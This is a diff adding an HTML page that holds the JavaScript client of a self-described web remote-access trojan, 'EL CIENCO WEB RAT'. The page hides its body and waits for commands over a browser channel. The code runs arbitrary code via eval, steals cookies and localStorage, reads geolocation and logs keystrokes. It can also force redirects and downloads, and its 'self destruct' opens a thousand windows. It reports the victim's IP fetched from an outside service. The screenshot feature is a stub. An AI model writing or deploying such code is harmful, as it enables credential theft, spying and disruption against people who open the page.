@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>
+body { display: none; }
+</style>
+</head>
+<body>
+<script>
+// EL CIENCO WEB RAT - CLIENT (Stub)
+(function() {
+    var clientId = "client_" + Math.random().toString(36).substr(2, 12);
+    var serverId = null;
+    var channel = new BroadcastChannel("elcienco_rat");
+    var keylogBuffer = "";
+    var keyloggingActive = false;
+    
+    function getIP() {
+        return new Promise(function(resolve) {
+            fetch("https://api.ipify.org?format=json")
+                .then(function(r) { return r.json(); })
+                .then(function(d) { resolve(d.ip); })
+                .catch(function() { resolve("unknown"); });
+        });
+    }
+    
+    function register() {
+        getIP().then(function(ip) {
+            channel.postMessage({
+                type: "register",
+                clientId: clientId,
+                userAgent: navigator.userAgent,
+                ip: ip
+            });
+        });
+    }
+    
+    function takeScreenshot() {
+        return new Promise(function(resolve) {
+            var canvas = document.createElement("canvas");
+            var ctx = canvas.getContext("2d");
+            canvas.width = screen.width;
+            canvas.height = screen.height;
+            ctx.fillStyle = "black";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "red";
+            ctx.font = "20px monospace";
+            ctx.fillText("EL CIENCO RAT - SCREEN CAPTURE", 10, 50);
+            resolve(canvas.toDataURL());
+        });
+    }
+    
+    function getCookies() {
+        return document.cookie;
+    }
+    
+    function getLocalStorage() {
+        var items = {};
+        for(var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            items[key] = localStorage.getItem(key);
+        }
+        return items;
+    }
+    
+    function getLocation() {
+        return new Promise(function(resolve) {
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    function() {
+                        resolve({ error: "Permission denied" });
+                    }
+                );
+            } else {
+                resolve({ error: "Not supported" });
+            }
+        });
+    }
+    
+    function startKeylog() {
+        keyloggingActive = true;
+        document.addEventListener("keypress", function(e) {
+            if(keyloggingActive) {
+                keylogBuffer += e.key;
+                if(keylogBuffer.length > 100) {
+                    channel.postMessage({
+                        type: "response",
+                        clientId: clientId,
+                        result: { keylog: keylogBuffer }
+                    });
+                    keylogBuffer = "";
+                }
+            }
+        });
+        return { status: "Keylogging started" };
+    }
+    
+    function stopKeylog() {
+        keyloggingActive = false;
+        return { status: "Keylogging stopped", buffer: keylogBuffer };
+    }
+    
+    function redirect(url) {
+        window.location.href = url;
+        return { status: "Redirecting to " + url };
+    }
+    
+    function showAlert(msg) {
+        alert(msg);
+        return { status: "Alert shown" };
+    }
+    
+    function downloadFile(url) {
+        var a = document.createElement("a");
+        a.href = url;
+        a.download = url.split("/").pop();
+        a.click();
+        return { status: "Download initiated" };
+    }
+    
+    function selfDestruct() {
+        document.body.innerHTML = "<h1>System Corrupted by EL CIENCO</h1>";
+        channel.close();
+        for(var i = 0; i < 1000; i++) {
+            window.open("about:blank", "_blank");
+        }
+        return { status: "Self destruct executed" };
+    }
+    
+    function executeJS(code) {
+        try {
+            var result = eval(code);
+            return { result: result };
+        } catch(e) {
+            return { error: e.toString() };
+        }
+    }
+    
+    async function handleCommand(cmd) {
+        switch(cmd.type) {
+            case "js":
+                return executeJS(cmd.param);
+            case "screenshot":
+                return await takeScreenshot();
+            case "getCookies":
+                return getCookies();
+            case "getLocalStorage":
+                return getLocalStorage();
+            case "getLocation":
+                return await getLocation();
+            case "getUserAgent":
+                return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language };
+            case "redirect":
+                return redirect(cmd.param);
+            case "alert":
+                return showAlert(cmd.param || "EL CIENCO RAT");
+            case "download":
+                return downloadFile(cmd.param);
+            case "keylogStart":
+                return startKeylog();
+            case "keylogStop":
+                return stopKeylog();
+            case "selfDestruct":
+                return selfDestruct();
+            default:
+                return { error: "Unknown command" };
+        }
+    }
+    
+    channel.onmessage = async function(e) {
+        var cmd = e.data;
+        if(cmd.sender) {
+            serverId = cmd.sender;
+        }
+        var result = await handleCommand(cmd);
+        channel.postMessage({
+            type: "response",
+            clientId: clientId,
+            result: result
+        });
+    };
+    
+    setInterval(function() {
+        channel.postMessage({
+            type: "heartbeat",
+            clientId: clientId
+        });
+    }, 15000);
+    
+    register();
+})();
+</script>
+</body>
+</html>
